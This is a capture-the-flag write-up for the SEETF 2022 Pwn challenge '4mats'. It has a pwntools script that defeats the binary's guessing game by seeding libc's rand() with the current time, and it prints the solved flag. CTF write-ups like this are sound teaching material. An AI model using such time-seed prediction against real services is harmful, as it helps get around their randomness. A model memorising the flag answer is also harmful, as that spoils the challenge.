---
name: 4mats (2022)
event: Social Engineering Experts CTF 2022
category: Pwn
description: Writeup for 4mats (Pwn) - Social Engineering Experts CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# 4mats

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/-cc4U1H53F8/0.jpg)](https://youtu.be/-cc4U1H53F8?t=1199 "Social Engineering Experts CTF 2022: 4mats")

## Description

> Lets get to know each other

## Solution

{% code overflow="wrap" %}
```py
from pwn import *
from time import time
from ctypes import CDLL

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF('./vuln', checksec=False)

# Lib-C for rand()
libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

# Create process (level used to reduce noise)
io = process(level='error')  # Local
# io = remote('fun.chall.seetf.sg', 50001)  # Remote

io.sendlineafter(b':', b'crypto')  # Submit name

io.sendlineafter(b'2. Do I know you?', b'1')  # Guess value

libc.srand(int(time()))  # Call srand() with current time as seed
guess = libc.rand() % 1000000  # Predict computers turn

io.sendlineafter(b'Guess my favourite number!', str(guess).encode())  # Submit guess

io.recvlines(2)
info(io.recv().decode())  # Print flag
```
{% endcode %}

Flag: `SEE{4_f0r_4_f0rm4t5_0ebdc2b23c751d965866afe115f309ef}`
